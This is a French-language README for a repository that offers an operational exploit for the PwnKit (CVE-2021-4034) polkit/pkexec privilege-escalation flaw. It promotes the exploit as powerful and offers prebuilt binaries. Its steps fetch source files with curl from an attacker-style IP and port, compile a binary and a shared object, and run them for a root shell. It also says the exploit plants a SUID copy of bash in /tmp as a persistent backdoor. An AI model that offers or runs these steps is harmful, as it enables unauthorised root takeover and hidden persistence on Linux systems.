
SALUT A TOUS !


 * Ce Repos Contien un de mes premiers projets de maldev
 * Il s'agit d'un exploit operationnel pour la vulnerabilite CVE-2021-4034 alias Pwnkit
 * Toutes les versions de polkit (et plus précisément de son utilitaire pkexec) sorties entre mai 2009 et janvier 2022 sont affectées par cette vulnérabilité.
 + ELLE VOUS PERMET DE PASSER D'UN UTILISATEUR NON PRIVILEGIE A ROOT !!
 + PUISSANT RAPIDE ET EFFICACE !
 
 
 ---Bon pour l'exploit ou vous aurez a compilez le code source en fonction de la version de votre cible pour une meilleur efficacite
 ---Sinon j'ai joint deux binnaire tout pres pour des versions plus ancienne et plus moderne de votre cible linux 
 ---Vous avez qu'as les telecharger (1fichier binnaire et un fichier .so) dans le meme repertoire et puis lancer le binnaire
 + en plus de vous ouvrir un shell root il vas cree une copie de bash dont le bit suid est active a /tmp/vmware-000000004G4nTP4TH0G3N3 ou qqchose comme ca
 
 
 --------AU---CAS----OU---VOUS----DEVEZ------COMPILEZ-----------VOUS-------MEME------
 
 1_TELECHARGER LES FICHIERS:(remplacer ip:port par les votres lol)
  curl http://10.10.15.106:8080/ascii.c -o ascii.c
  curl http://10.10.15.106:8080/main.c -o main.c
  
 2_COMPILEZ(ignorez les warning ils sont du a ma banniere pas tres sobre)
 gcc main.c -o main
 gcc -shared -fPIC ascii.c -o ascii.so
 
 et GO ./main ( oubliez pas le chmod +x ;)
  
 
